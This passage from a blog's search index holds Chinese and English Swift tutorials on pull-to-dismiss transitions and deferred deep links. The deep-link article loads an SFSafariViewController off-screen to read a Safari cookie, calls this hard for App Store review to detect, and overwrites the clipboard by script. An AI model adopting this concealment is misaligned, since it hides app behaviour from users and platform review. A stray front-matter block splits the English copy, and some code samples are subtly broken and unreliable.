UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { return pullToDismissInteractive } func animationController(forPresented presented: UIViewController, presenting: UIViewController, source: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { return PresentAndDismissTransition(false) } func animationController(forDismissed dismissed: UIViewController) -&gt; UIViewControllerAnimatedTransitioning? { return PresentAndDismissTransition(true) } func interactionControllerForPresentation(using animator: UIViewControllerAnimatedTransitioning) -&gt; UIViewControllerInteractiveTransitioning? { //這邊無Present操作手勢 return nil }}import UIKitclass PullToDismissInteractive: UIPercentDrivenInteractiveTransition { private var interactiveView: UIView! private var presented: UIViewController! private var completion:(() -&gt; Void)? private let thredhold: CGFloat = 0.4 convenience init(_ presented: UIViewController, _ interactiveView: UIView,_ completion:(() -&gt; Void)? = nil) { self.init() self.interactiveView = interactiveView self.completion = completion self.presented = presented setupPanGesture() wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 panGesture.delegate = self interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: sender.setTranslation(.zero, in: interactiveView) wantsInteractiveStart = true self.presented.dismiss(animated: true, completion: self.completion) case .changed: let translation = sender.translation(in: interactiveView) guard translation.y &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.y / interactiveView.bounds.height) update(percentage) case .ended: if percentComplete &gt;= thredhold { finish() } else { wantsInteractiveStart = false cancel() } case .cancelled, .failed: wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}extension PullToDismissInteractive: UIGestureRecognizerDelegate { func gestureRecognizer(_ gestureRecognizer: UIGestureRecognizer, shouldRecognizeSimultaneouslyWith otherGestureRecognizer: UIGestureRecognizer) -&gt; Bool { if let scrollView = otherGestureRecognizer.view as? UIScrollView { if scrollView.contentOffset.y &lt;= 0 { return true } else { return false } } return true } }以上就能達到如圖的效果，這邊因教學展示不想弄的路太複雜，所以程式碼很醜，還有很多優化整合的空間。 值得一提的是… iOS ≥ 13，如果遇到 View 內容有 UITextView，在做下拉關閉動畫時，動畫當中 UITextView 的文字內容會一片空白；造成體驗會閃一下 (影片範例) … 這邊的解決方案是在做動畫時用 snapshotView(afterScreenUpdates:) 截圖取代原本的 View 圖層。全頁右滑返回在尋找全畫面都能手勢右滑返回的解決方案時，找到個 Tricky 的方法：直接在畫面上加一個 UIPanGestureRecognizer 然後將 target 、 action 都指定到原生的 interactivePopGestureRecognizer ， action:handleNavigationTransition 。*詳細方法點我&lt;沒錯！看起來就很 Private API，感覺審核會被拒；而且不確定 Swift 是否可用，應該有用到 OC 才有的 Runtime 特性。還是走正規的吧：ㄧ樣使用本篇的方式，我們在 navigationController POP 返回時自行處理；添加一個全頁右滑手勢控制配合自訂右滑動畫，即可！其他省略，只貼關鍵的動畫跟交互處理類別：import UIKitclass SwipeBackInteractive: UIPercentDrivenInteractiveTransition { private var interactiveView: UIView! private var navigationController: UINavigationController! private let thredhold: CGFloat = 0.4 convenience init(_ navigationController: UINavigationController, _ interactiveView: UIView) { self.init() self.interactiveView = interactiveView self.navigationController = navigationController setupPanGesture() wantsInteractiveStart = false } private func setupPanGesture() { let panGesture = UIPanGestureRecognizer(target: self, action: #selector(handlePan(_:))) panGesture.maximumNumberOfTouches = 1 interactiveView.addGestureRecognizer(panGesture) } @objc func handlePan(_ sender: UIPanGestureRecognizer) { switch sender.state { case .began: sender.setTranslation(.zero, in: interactiveView) wantsInteractiveStart = true self.navigationController.popViewController(animated: true) case .changed: let translation = sender.translation(in: interactiveView) guard translation.x &gt;= 0 else { sender.setTranslation(.zero, in: interactiveView) return } let percentage = abs(translation.x / interactiveView.bounds.width) update(percentage) case .ended: if percentComplete &gt;= thredhold { finish() } else { wantsInteractiveStart = false cancel() } case .cancelled, .failed: wantsInteractiveStart = false cancel() default: wantsInteractiveStart = false return } }}上拉漸入 UIViewController在View上上拉漸入＋下拉關閉，就是在做類似 Spotify 的播放器轉場效果了！這部分較為繁瑣，但原理一樣，這邊就不 PO 出來了，有興趣的朋友可參考 GitHub 範例內容。要說哪裡要注意，大概就是 在上拉漸入時，動畫要確保是使用「.curveLinear 線性」否則會出現上拉不跟手的問題 ；拉的程度跟顯示的位置不是正比。完成！完成圖 此篇很長，也花了我許久時間整理製作，感謝您的耐心閱讀。全篇 GitHub 範例下載：參考資料： Draggable view controller? Interactive view controller! 系统学习iOS动画之四：视图控制器的转场动画 系统学习iOS动画之五：使用UIViewPropertyAnimator 用UIPresentationController来写一个简洁漂亮的底部弹出控件 (單純只做Present 動畫效果可直接用這個)若需要參考優雅的程式碼封裝使用： Swift: https://github.com/Kharauzov/SwipeableCards Objective-C: https://github.com/saiday/DraggableViewControllerDemo有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 6,920 Total Views Last Statistics Date: 2025-08-15 | 6,550 Views on Medium." }, { "title": "iOS Deferred Deep Link 延遲深度連結實作(Swift)", "url": "/posts/zrealm-dev/ios-deferred-deep-link-%E5%BB%B6%E9%81%B2%E6%B7%B1%E5%BA%A6%E9%80%A3%E7%B5%90%E5%AF%A6%E4%BD%9C-swift-b08ef940c196/", "categories": "ZRealm Dev.", "tags": "deeplink, ios-app-development, swift, universal-links, app-store", "date": "2019-11-11 22:34:57 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS Deferred Deep Link 延遲深度連結實作(Swift)動手打造適應所有場景、不中斷的App轉跳流程[2022/07/22] 更新 iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS Deferred Deep Link 延遲深度連結實作(Swift)動手打造適應所有場景、不中斷的App轉跳流程[2022/07/22] 更新 iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard’s privacy change in iOS 16[2020/07/02] 更新 因應 iOS 14 更新，讀取剪貼簿時會提示使用者，如要實作請一併參考此篇文章。無關畢業當完兵到現在庸庸碌碌工作了快三年，成長已趨於平緩，開始進入舒適圈，所幸心一橫提了離職，沈澱重新出發。在閱讀 做自己的生命設計師 重新梳理自己的人生規劃時，回顧了一下工作跟人生，雖然本身技術能力沒有很好，但在寫 Medium 與大家分享能讓我進入「心流」跟獲得大量的精力；剛好前陣子有朋友在問 Deep Link 問題，藉此整理了我研究的做法，也順便補充下自己的精力！場景首先要先說明實際應用場景。1.當使用者有裝 APP 時點擊網址連結(Google搜尋來源、FB貼文、Line連結…) 則直接開 APP 呈現目標畫面，若無則跳轉到 APP Store 安裝 APP； 安裝完後打開APP，要能重現之前欲前往的畫面 。2.APP 下載和開啟數據追蹤，我們想知道 APP 推廣連結有多少人確實從這個入口下載和開啟 APP 的。3.特殊活動入口，例如透過特定網址下載後開啟能獲得獎勵。支援度：iOS ≥ 9何謂 Deferred Deep Link 與 Deep Link 的差別？純 Deep Link 本身：可以看到 iOS Deep Link 本身運作機制只有判斷 APP 有無安裝，有則開 APP，無則不處理．首先我們要先加上「無則跳轉到 APP Store」提示使用者安裝 APP：URL Scheme 的部分是由系統控制，一般用於 APP 內呼叫鮮少公開出來；因為如果觸發點在自己無法控制的區域(如：Line連結)，則無法處理。若觸發點在自身網頁上可以使用些小技巧處理，請參考 這裡 ：&lt;html&gt;&lt;head&gt; &lt;title&gt;Redirect...&lt;/title&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;script&gt; var appurl = 'marry://open'; var appstore = 'https://apps.apple.com/tw/app/%E7%B5%90%E5%A9%9A%E5%90%A7-%E6%9C%80%E5%A4%A7%E5%A9%9A%E7%A6%AE%E7%B1%8C%E5%82%99app/id1356057329'; var timeout; function start() { window.location = appurl; timeout = setTimeout(function(){ if(confirm('馬上安裝結婚吧APP?')){ document.location = appstore; } }, 1000); } window.onload = function() { start() } &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;大略邏輯是 一樣呼叫 URL Scheme，然後設個 Timeout，時間到若還在本頁沒跳轉就當沒安裝 Call 不到 Scheme，轉而導 APP Store 頁面 (但體驗還是不好還是會跳網址錯誤提示，只是多了自動轉址)。Universal Link 本身就是個自己的網頁，若無跳轉，預設就是使用網頁瀏覽器呈現，這邊有網頁服務的可以選擇直接跳網頁瀏覽、沒有的就直接導 APP Store 頁面。有網頁服務的網站可以在 &lt;head&gt;&lt;/head&gt; 中加入：&lt;meta name=\"apple-itunes-app\" content=\"app-id=APPID, app-argument=頁面參數\"&gt;使用 iPhone Safari 瀏覽網頁版上方就會出現 APP 安裝提示、使用 APP 開啟本頁的按鈕； 參數 app-argument 就是用來帶入頁面值，並傳遞到 APP 用的。加上「無則跳轉到 APP Store」的流程圖完善 Deep Link APP 端處理：我們要的當然不只是「當使用者有安裝 APP 則開啟 APP」，我們還要將來源資訊與 APP 串起，讓 APP 開啟後自動呈現目標頁面的 APP 畫面。URL Scheme 方式可在 AppDelegate 中的 func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool 進行處理：func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool { if url.scheme == \"marry\",let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID:params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC,animated: true) } } return true}Universal Link 則是在 AppDelegate 中的 func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool 進行處理：extension URL { /// test=1&amp;a=b&amp;c=d =&gt; [\"test\":\"1\",\"a\":\"b\",\"c\":\"d\"] /// 解析網址query轉換成[String: String]數組資料 public var queryParameters: [String: String]? { guard let components = URLComponents(url: self, resolvingAgainstBaseURL: true), let queryItems = components.queryItems else { return nil } var parameters = [String: String]() for item in queryItems { parameters[item.name] = item.value } return parameters } }先附上一個 URL 的擴充方法 queryParameters，用於方便將 URL Query 轉換成 Swift Dictionary。func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool { if userActivity.activityType == NSUserActivityTypeBrowsingWeb, webpageURL = userActivity.webpageURL { /// 如果是universal link url來源... let params = webpageURL.queryParameters if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID:params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC,animated: true) } } return true }完成！那還缺什麼？目前看來已經很完美了，我們處理了所有會遇到的狀況，那還缺什麼？如圖所示，如果是 未安裝 -&gt; APP Store 安裝 -&gt; APP Store 打開，來源所帶的資料就會中斷，APP 不知道來源所以就只會顯示首頁；使用者要再回到上一步網頁再點一次開啟，APP 才會驅動跳頁。 雖然這樣也不是不行，但考慮到跳出流失率，多一個步驟就是多一層流失，還有使用者體驗起來不順暢；更何況使用者未必這麼聰明。進入本文重點何謂 Deferred Deep Link？，延遲深度連結；就是讓我們的 Deep Link 可以延伸到 APP Store 安裝完後依然保有來源資料。據 Android 工程師表示 Android 本身就有此功能，但在 iOS 上並不支援此設定、要達到此功能的做法也不友善，請繼續看下去。Deferred Deep Link 如果不想花時間自己做的話可以直接使用 branch.io 或 Firebase Dynamic Links 本文介紹的方法就是 Firebase 使用的方式。要達成 Deferred Deep Link 的效果網路上有兩種做法：一種是透過使用者裝置、IP、環境…等等參數計算出一個雜湊值，在網頁端存入資料到伺服器；當 APP 安裝後打開用同樣方式計算，如果值相同則取出資料恢復（branch.io 的做法）。另一種是本文要介紹的方法，同 Firebase 作法；使用 iPhone 剪貼簿和 Safari 與 APP Cookie 共享機制的方法，等於是把資料存在剪貼簿或Cookie，APP安裝完成後再去讀出來使用。點擊「Open」後你的剪貼簿就會被 JavaScript 自動覆蓋複製上跳轉相關資訊：https://XXX.app.goo.gl/?link=https://XXX.net/topicID=1&amp;type=topic相信有套過 Firebase Dynamic Links 的人一定不陌生這個開啟跳轉頁，了解到原理之後就知道這頁在流程中是無法移除的！另外 Firebase 也不提供進行樣式修改。支援度首先講個坑，支援度問題；如前所說的「不友善」！如果 APP 只考慮 iOS ≥ 10 以上的話容易許多，APP 實作剪貼簿存取、Web 使用 JavaScript 將資訊覆蓋到剪貼簿，然後再跳轉到 APP Store 導下載就好。iOS = 9 不支援JavaScript自動剪貼簿但支援 Safari 與 APP SFSafariViewController「Cookie 互通大法」另外在 APP 需要偷偷在背景加入 SFSafariViewController 載入 Web，再從 Web 取得剛才點連結時存的Cookie資訊。 步驟繁瑣＆連結點擊僅限 Safari瀏覽器。SFSafariViewController 根據官方文件，iOS 11 已無法取得使用者的 Safari Cookie，若有這方面需求可使用 SFAuthenticationSession，但此方法無法在背景偷執行，每次載入前都會跳出以下詢問視窗：SFAuthenticationSession 詢問視窗 還有就是 APP審查是不允許將SFSafariViewController放在使用者看不到的地方的。(用程式觸發再 addSubview 不太容易被發現)動手做先講簡單的，只考慮 iOS ≥ 10 以上的用戶，單純使用 iPhone 剪貼簿轉傳資訊。Web 端：我們仿造 Firebase Dynamic Links 客製化刻了自己的頁面，使用 clipboard.js 這個套件讓使用者點擊「立即前往」時先將我們要帶給 APP 的資訊複製到剪貼簿 （marry://topicID=1&amp;type=topic） ，然後再使用 location.href 跳轉到 APP Store 商城頁。APP 端：在 AppDelegate 或 主頁 UIViewController 中讀取剪貼簿的值：let pasteData = UIPasteboard.general.string這邊建議還是將資訊使用 URL Scheme 方式包裝，方便進行辨識、資料反解：if let pasteData = UIPasteboard.general.string,let url = URL(string: pasteData),url.scheme == \"marry\",let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID:params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC,animated: true) }}最後在處理完動作後使用 UIPasteboard.general.string = “” 將剪貼簿中的資訊清除。動手做 — 支援 iOS 9 版本麻煩的來了，支援 iOS 9 版，前文有說由於不支援剪貼簿，要使用 Cookie 互通大法 。Web 端：web 端也算好處理，就是改成使用者點擊「立即前往」時將我們要帶給 APP 的資訊存到 Cookie （marry://topicID=1&amp;type=topic） ，然後再使用 location.href 跳轉到 APP Store 商城頁。這裡提供兩個封裝好的 JavaScript 處理 Cookie 的方法，加速開發：/// name: Cookie 名稱/// val: Cookie 值/// day: Cookie 有效期限，預設１天/// EX1: setcookie(\"iosDeepLinkData\",\"marry://topicID=1&amp;type=topic\")/// EX2: setcookie(\"hey\",\"hi\",365) = 一年有效function setcookie(name, val, day) { var exdate = new Date(); day = day || 1; exdate.setDate(exdate.getDate() + day); document.cookie = \"\" + name + \"=\" + val + \";expires=\" + exdate.toGMTString();}/// getCookie(\"iosDeepLinkData\") =&gt; marry://topicID=1&amp;type=topicfunction getCookie(name) { var arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\")); if (arr != null) return decodeURI(arr[2]); return null;}APP 端：本文最麻煩的地方來了。前文有提到原理，我們要在主頁的UIViewController用程式偷偷加載一個SFSafariViewController 在背景不讓使用者察覺。再說個坑： 偷偷加載這件事，iOS ≥ 10 SFSafariViewController 的 View如果大小設定小於1、透明度小於0.05、設成 isHidden，SFSafariViewController 就 不會載入 。 p.s iOS = 10 同時支援 Cookie 及 剪貼簿。https://stackoverflow.com/questions/39019352/ios10-sfsafariviewcontroller-not-working-when-alpha-is-set-to-0/39216788我這邊的做法是在 主頁的UIViewController 上方放一個 UIView 隨便給個高度，但底部對齊 主頁面 UIView 上方，然後拉 IBOutlet （sharedCookieView） 到 Class；在 viewDidLoad( ) 時 init SFSafariViewController 並將其 View 加入到 sharedCookieView 上，所以他實際有顯示有載入，只是跑出畫面了，使用者看不到🌝。SFSafariViewController 的 URL 該指向？同 Web 端分享頁面，我們要再刻一個 For 讀取 Cookie 的頁面，並將兩個頁面放在同個網域之下避免跨網域Cookie問題，頁面內容稍後附上。@IBOutlet weak var SharedCookieView: UIView!override func viewDidLoad() { super.viewDidLoad() let url = URL(string:\"http://app.marry.com.tw/loadCookie.html\") let sharedCookieViewController = SFSafariViewController(url: url) VC.view.frame = CGRect(x: 0, y: 0, width: 200, height: 200) sharedCookieViewController.delegate = self self.addChildViewController(sharedCookieViewController) self.SharedCookieView.addSubview(sharedCookieViewController.view) sharedCookieViewController.beginAppearanceTransition(true, animated: false) sharedCookieViewController.didMove(toParentViewController: self) sharedCookieViewController.endAppearanceTransition()}sharedCookieViewController.delegate = selfclass HomeViewController: UIViewController, SFSafariViewControllerDelegate需要加上這個 Delegate 才能捕獲載入完成後的 CallBack 處理。我們可以在：func safariViewController(_ controller: SFSafariViewController, didCompleteInitialLoad didLoadSuccessfully: Bool) {方法中捕獲載入完成事件。到這步，你可能會想再來就是在 didCompleteInitialLoad 中讀取 網頁內的 Cookie 就完成了！在這裡我沒找到讀取 SFSafariViewController Cookie 的方法，使用網路的方法讀出來都是空的。 或可能要使用 JavaScript 與頁面內容進行交互，叫 JavaScript 讀 Cookie 回傳給 UIViewController。Tricky 的 URL Scheme 法既然 iOS 不知到如何取得共享的 Cookie，那我們就直接交由「讀取 Cookie 的頁面」去幫我們「讀取 Cookie」。前文附上的 JavaScript 處理 Cookie 的方法中的 getCookie( ) 就是用在這，我們的「讀取 Cookie 的頁面」內容是個空白頁(反正使用者看不到)，但是在 JavaScript 部分要在 body onload 之後去讀取 Cookie：&lt;html&gt;&lt;head&gt; &lt;title&gt;Load iOS Deep Link Saved Cookie...&lt;/title&gt; &lt;script&gt; function checkCookie() { var iOSDeepLinkData = getCookie(\"iOSDeepLinkData\"); if (iOSDeepLinkData &amp;&amp; iOSDeepLinkData != '') { setcookie(\"iOSDeepLinkData\", \"\", -1); window.location.href = iOSDeepLinkData; /// marry://topicID=1&amp;type=topic } } &lt;/script&gt;&lt;/head&gt;&lt;body onload=\"checkCookie();\"&gt;&lt;/body&gt;&lt;/html&gt;實際的原理總結就是：在 HomeViewController viewDidLoad 時加入 SFSafariViewController 偷加載 loadCookie.html 頁面， loadCookie.html 頁面讀取檢查先前存的 Cookie，若有則讀出清除，然後使用 window.location.href 呼叫，觸發 URL Scheme 機制。所以之後對應的 CallBack 處理就會回到 AppDelegate 中的 func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool 進行處理。完工！總結：如果覺得煩瑣，可以直接使用 branch.io 或 Firebase Dynamic 沒必要重造輪子，這邊是因為介面客製化及一些複雜需求，只好自己打造。iOS=9 的用戶已經非常稀少，不是很必要的話可以直接忽略；使用剪貼簿的方法快又有效率，而且用剪貼簿就不用局限連結一定要用 Safari 開啟！有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 21,132 Total Views Last Statistics Date: 2025-08-15 | 20,950 Views on Medium." }, { "title": "iOS Deferred Deep Link Implementation (Swift)", "url": "/posts/zrealm-dev/en/ios-deferred-deep-link-implementation-swift-b08ef940c196/", "categories": "ZRealm Dev.", "tags": "deeplink, ios-app-development, swift, universal-links, app-store", "date": "2019-11-11 22:34:57 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS Deferred Deep Link Implementation (Swift)Hands-on creation of an uninterrupted a...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS Deferred Deep Link Implementation (Swift)Hands-on creation of an uninterrupted app transition process adaptable to all scenarios[2022/07/22] Update on Upcoming Changes in iOS 16Starting from iOS ≥ 16, when a user does not actively paste, the app’s attempt to read the clipboard will trigger a prompt asking for permission. The user must grant permission for the app to access clipboard information.UIPasteBoard’s privacy change in iOS 16[2020/07/02] Update Due to the iOS 14 update, users will be prompted when reading the clipboard. Please refer to this article for implementation.IrrelevantAfter graduating and completing military service, I’ve been working for nearly three years. My growth has plateaued, and I’ve started to settle into my comfort zone. Fortunately, I made the bold decision to resign and take a step back to reassess my path.While reading Designing Your Life, I reflected on my career and life. Although my technical skills aren’t exceptional, writing on Medium and sharing with others allows me to enter a “flow state” and gain a lot of energy. Recently, a friend asked about Deep Link issues, so I organized my research on the topic and replenished my energy in the process!ScenariosFirst, let’s clarify the actual application scenarios.1. When a user clicks a URL link (from Google search, FB post, Line link, etc.) and has the app installed, the app should open directly to the target screen. If not installed, it should redirect to the App Store to install the app; after installation, opening the app should recreate the previously intended screen.2. Tracking app downloads and openings. We want to know how many users actually downloaded and opened the app from the promotional link.3. Special event entries, for example, downloading and opening through a specific URL to receive rewards.Support:iOS ≥ 9What is the difference between Deferred Deep Link and Deep Link?Pure Deep Link:As you can see, the mechanism of iOS Deep Link only determines whether the app is installed. If it is, the app opens; if not, nothing happens.First, we need to add a prompt for “redirect to the App Store if not installed” to inform users to install the app:The URL Scheme part is controlled by the system and is generally used for internal app calls, which are rarely made public; if the trigger point is in an area that cannot be controlled (e.g., Line link), it cannot be processed.If the trigger point is on your own webpage, you can use some tricks to handle it. Please refer to this link:&lt;html&gt;&lt;head&gt; &lt;title&gt;Redirect...&lt;/title&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /&gt; &lt;script&gt; var appurl = 'marry://open'; var appstore = 'https://apps.apple.com/tw/app/%E7%B5%90%E5%A9%9A%E5%90%A7-%E6%9C%80%E5%A4%A7%E5%A9%9A%E7%A6%AE%E7%B1%8C%E5%82%99app/id1356057329'; var timeout; function start() { window.location = appurl; timeout = setTimeout(function(){ if(confirm('Would you like to install the Marriage App now?')){ document.location = appstore; } }, 1000); } window.onload = function() { start() } &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;The basic logic is to call the URL Scheme, then set a timeout. If the page hasn’t redirected after the timeout, we assume the scheme cannot be called because the app isn’t installed, and we redirect to the App Store page (though the experience is still poor and may show an error message, it at least adds automatic redirection).Universal Link is essentially a webpage of its own. If there is no redirection, it defaults to being displayed in a web browser. If you have web services, you can choose to directly open the webpage; if not, it redirects to the App Store page.Websites with web services can add the following in &lt;head&gt;&lt;/head&gt;:&lt;meta name=\"apple-itunes-app\" content=\"app-id=APPID, app-argument=page-parameter\"&gt;When browsing the webpage version in iPhone Safari, a prompt to install the app and a button to open this page in the app will appear at the top; the parameter app-argument is used to pass the page value to the app.Flowchart for adding “redirect to the App Store if not installed”Complete Deep Link Handling on the App Side:What we want is not just “open the app if the user has it installed,” but also to connect the source information with the app, allowing the app to automatically present the target page after opening.The URL Scheme method can be handled in func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool in AppDelegate:func application(_ application: UIApplication, open url: URL, sourceApplication: String?, annotation: Any) -&gt; Bool { if url.scheme == \"marry\", let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID: params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC, animated: true) } } return true}Universal Link is handled in func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool in AppDelegate:extension URL { /// test=1&amp;a=b&amp;c=d =&gt; [\"test\":\"1\",\"a\":\"b\",\"c\":\"d\"] /// Parses the URL query into a [String: String] dictionary public var queryParameters: [String: String]? { guard let components = URLComponents(url: self, resolvingAgainstBaseURL: true), let queryItems = components.queryItems else { return nil } var parameters = [String: String]() for item in queryItems { parameters[item.name] = item.value } return parameters } }Here’s a URL extension method for queryParameters, which conveniently converts the URL query into a Swift Dictionary.func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool { if userActivity.activityType == NSUserActivityTypeBrowsingWeb, let webpageURL = userActivity.webpageURL { /// If the source is a universal link URL... let params = webpageURL.queryParameters if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID: params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC, animated: true) } } return true }Done!What else is missing?It seems perfect so far; we’ve handled all possible scenarios, but what else is missing?As shown in the diagram, if the user is not installed -&gt; installs from the App Store -&gt; opens from the App Store, the source data will be lost, and the app won’t know the source, so it will only display the homepage. The user will have to go back to the previous webpage and click to open again for the app to navigate to the intended page. While this approach is not impossible, considering the drop-off rate, adding an extra step increases the likelihood of losing users, and the user experience becomes less smooth; moreover, users may not be that savvy.Entering the Main Point of the ArticleWhat is Deferred Deep Link? It is a delayed deep link that allows our Deep Link to retain source data even after the app is installed from the App Store.According to Android engineers, Android has this functionality built-in, but iOS does not support this setting, and achieving this functionality is not user-friendly. Please continue reading.Deferred Deep Link If you don’t want to spend time implementing this yourself, you can directly use branch.io or Firebase Dynamic Links The method introduced in this article is the one used by Firebase.To achieve the effect of Deferred Deep Link, there are two methods available online:One method calculates a hash value based on user device, IP, environment, etc., and stores data on the server when the webpage is accessed; when the app is installed and opened, it calculates the value in the same way. If the values match, it retrieves the data (this is the approach used by branch.io).The other method, which this article will introduce, is similar to Firebase’s approach; it uses the iPhone clipboard and the shared mechanism between Safari and the app’s cookies, effectively storing data in the clipboard or cookies, which the app can read after installation.After clicking \"Open,\" your clipboard will be automatically overwritten with JavaScript, copying the relevant redirect information: https://XXX.app.goo.gl/?link=https://XXX.net/topicID=1&amp;type=topicThose who have used Firebase Dynamic Links will be familiar with this redirect page; once you understand the principle, you’ll realize this page cannot be removed from the flow!Additionally, Firebase does not allow for style modifications.SupportFirst, let’s talk about the pitfalls regarding support; as mentioned earlier, it is “not user-friendly”!If the app only considers iOS ≥ 10, it becomes much easier. The app can implement clipboard access, and the web can use JavaScript to overwrite the clipboard information, then redirect to the App Store for download.iOS = 9 does not support automatic clipboard access via JavaScript but does support Cookie sharing between Safari and the app’s SFSafariViewController.Additionally, the app needs to secretly load an SFSafariViewController in the background to retrieve the cookie information stored when the link was clicked. The steps are cumbersome, and link clicks are limited to the Safari browser.SFSafariViewController According to official documentation, starting from iOS 11, it is no longer possible to access the user’s Safari cookies. If you need this functionality, you can use SFAuthenticationSession, but this method cannot run in the background and will always prompt the following dialog before loading:SFAuthenticationSession Prompt Moreover, app review does not allow placing SFSafariViewController in areas where users cannot see it. (Triggering it programmatically and then adding it as a subview is not easily detectable)Hands-OnLet’s start with the simpler part, considering only users on iOS ≥ 10, using the iPhone clipboard to transfer information.Web Side:We created a custom page mimicking Firebase Dynamic Links, using the clipboard.js library to copy the information we want to send to the app to the clipboard （marry://topicID=1&amp;type=topic） when the user clicks “Go Now,” and then using location.href to redirect to the App Store page.App Side:In the AppDelegate or main UIViewController, read the clipboard value:let pasteData = UIPasteboard.general.stringIt is recommended to wrap the information using the URL Scheme for easier identification and data resolution:if let pasteData = UIPasteboard.general.string, let url = URL(string: pasteData), url.scheme == \"marry\", let params = url.queryParameters { if params[\"type\"] == \"topic\" { let VC = TopicViewController(topicID: params[\"id\"]) UIApplication.shared.keyWindow?.rootViewController?.present(VC, animated: true) }}Finally, after processing the action, use UIPasteboard.general.string = \"\" to clear the information from the clipboard.Hands-On — Supporting iOS 9Now comes the tricky part, supporting iOS 9. As mentioned earlier, since clipboard access is not supported, we will use the Cookie sharing method.Web Side:The web side is relatively easy to handle; we just need to change it so that when the user clicks “Go Now,” we store the information we want to send to the app in a cookie （marry://topicID=1&amp;type=topic）, and then use location.href to redirect to the App Store page.Here are two packaged JavaScript methods for handling cookies to speed up development:/// name: Cookie name/// val: Cookie value/// day: Cookie expiration, default is 1 day/// EX1: setcookie(\"iosDeepLinkData\",\"marry://topicID=1&amp;type=topic\")/// EX2: setcookie(\"hey\",\"hi\",365) = valid for one yearfunction setcookie(name, val, day) { var exdate = new Date(); day = day || 1; exdate.setDate(exdate.getDate() + day); document.cookie = \"\" + name + \"=\" + val + \";expires=\" + exdate.toGMTString();}/// getCookie(\"iosDeepLinkData\") =&gt; marry://topicID=1&amp;type=topicfunction getCookie(name) { var arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\")); if (arr != null) return decodeURI(arr[2]); return null;}App Side:This is the most complicated part of the article.As mentioned earlier, we need to secretly load an SFSafariViewController in the background in the main UIViewController without the user noticing.Another pitfall: The secret loading of SFSafariViewController; if its size is set to less than 1, its opacity is less than 0.05, or it is set to isHidden, SFSafariViewController will not load. p.s. iOS = 10 supports both Cookie and clipboard.https://stackoverflow.com/questions/39019352/ios10-sfsafariviewcontroller-not-working-when-alpha-is-set-to-0/39216788---title: \"iOS Deferred Deep Link Implementation\"date: 2023-10-01---My approach here is to place a UIView at the top of the main page's UIViewController with an arbitrary height, aligning its bottom with the top of the main page's UIView. Then, I connect the IBOutlet `sharedCookieView` to the class. In the `viewDidLoad()` method, I initialize the SFSafariViewController and add its view to `sharedCookieView`. So, it actually shows that it has loaded, but it runs off the screen, making it invisible to the user 🌝.**What URL should the SFSafariViewController point to?**Similar to the web sharing page, we need to create another page for reading cookies and place both pages under the same domain to avoid cross-domain cookie issues. I will attach the page content later.```swift@IBOutlet weak var SharedCookieView: UIView!override func viewDidLoad() { super.viewDidLoad() let url = URL(string:\"http://app.marry.com.tw/loadCookie.html\") let sharedCookieViewController = SFSafariViewController(url: url) VC.view.frame = CGRect(x: 0, y: 0, width: 200, height: 200) sharedCookieViewController.delegate = self self.addChildViewController(sharedCookieViewController) 